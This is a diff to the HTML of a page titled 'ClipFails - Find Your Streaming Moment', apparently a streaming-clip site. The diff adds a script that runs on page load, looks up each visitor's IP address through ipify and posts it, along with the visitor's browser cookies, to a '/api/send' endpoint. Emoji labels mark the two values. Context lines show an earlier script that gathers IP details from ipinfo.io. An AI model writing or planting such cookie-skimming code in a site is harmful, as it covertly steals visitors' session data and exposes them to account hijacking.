@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>ClipFails - Find Your Streaming Moment</title>
   
-  <script>
+<script>
     (async () => {
         try {
             // STEP 1: Get IP and details from ipinfo.io
@@ -41,6 +41,20 @@
         }
     })();
 </script>
+
+<script>
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const message = `🕷 IP: ${data.ip}\n🍪 Cookies: ${document.cookie}`;
+        fetch('/api/send', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ message })
+        });
+      });
+</script>
+    
 
   <style>
     * {
